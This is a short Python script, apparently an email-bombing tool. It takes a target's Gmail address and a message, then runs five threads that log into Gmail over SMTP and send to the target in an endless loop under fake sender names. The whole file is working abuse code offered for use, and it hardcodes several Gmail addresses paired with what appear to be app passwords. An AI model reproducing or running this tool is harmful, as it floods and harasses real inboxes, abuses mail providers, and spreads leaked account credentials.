# *code:UTF-8*
# Coded By Cyber
import os
import smtplib
import sys
import time
import threading as thr
from banner import *

to = input(f"{am}The Target's Gmail Address: ")
body = input(f"{am}Message: ")
print('='*49)

#### BackEnd####
smtp_server = 'smtp.gmail.com'
port = 587


def SPAM(email, passwd):
    i = 5
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.login(email, passwd)
    while True:
        try:
            # msg = 'From: ' + "X_FKYOUSELF_X" + '\nSubject: ' + '\n' +body
            msg = f"From:  CyberDark \n Subject: {body}"
            server.sendmail(email, to, msg)
            # .format(G,W,i))
            sys.stdout.write(f"\r {G}Emails sent:{W}{i}  ")
            i = i+5
            time.sleep(2)
        except KeyboardInterrupt:
            server = smtplib.SMTP(smtp_server, port)
            print(Y+'\n\n[-] Canceled\n', W)
            server.quit()
            sys.exit()
        except BaseException:
            print(f"{R}\n\nSPAM5:{W}[!] The Target's email not found OR Connection closed.\n{W}")
            sys.exit()
        ###############


def SPAMm(email, passwd, num):
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.login(email, passwd)
    while True:
        try:
            msg = 'From: ' + "GG GG" + '\nSubject: ' + '\n' + body
            server.sendmail(email, to, msg)
            time.sleep(2)
        except KeyboardInterrupt:
            server = smtplib.SMTP(smtp_server, port)
            print(Y+'\n\n[-] Canceled\n', W)
            server.quit()
            sys.exit()
        except BaseException:
            print(R+"\n\nSPAM"+num+":", W +
                  "[!] The Target's email not found OR Connection closed.\n", W)
            sys.exit()


##############################
spam1 = thr.Thread(target=SPAMm, args=(
    'kiubizeb@gmail.com', 'uhblkauzdsuskeuf', '1'))
spam2 = thr.Thread(target=SPAMm, args=(
    'kiubihacked@gmail.com', 'orabecjqwszgjwri', '2'))
spam3 = thr.Thread(target=SPAMm, args=(
    'abdelrahemhack@gmail.com', 'reddfxybxndciwaj', '3'))
spam4 = thr.Thread(target=SPAMm, args=(
    'blackhat0100618', 'xfppmvulmyevzrhd', '4'))
spam5 = thr.Thread(target=SPAM, args=(
    'hackb011017@gmail.com', 'ljqdcdhifxjigwda'))

spam1.start()
spam2.start()
spam3.start()
spam4.start()
spam5.start()
spam1.join()
spam2.join()
spam3.join()
spam4.join()
spam5.join()